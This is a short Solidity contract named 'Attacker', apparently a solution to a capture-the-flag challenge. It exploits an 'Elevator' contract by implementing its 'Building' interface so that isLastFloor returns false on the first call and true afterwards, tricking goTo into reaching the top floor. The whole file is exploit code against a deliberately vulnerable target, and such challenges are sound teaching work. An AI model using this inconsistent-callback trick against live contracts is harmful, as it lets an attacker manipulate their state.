// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./Contract.sol";

contract Attacker is Building {
    uint counter;
    Elevator elevatorContract;

    constructor(address _elevatorContract) {
        elevatorContract = Elevator(_elevatorContract);
    }

    function isLastFloor(uint _floor) external override returns (bool) {
        if (counter == 0) {
            counter++;
            return false;
        } else {
            return true;
        }
    }

    function attack() public {
        elevatorContract.goTo(1);
    }
}
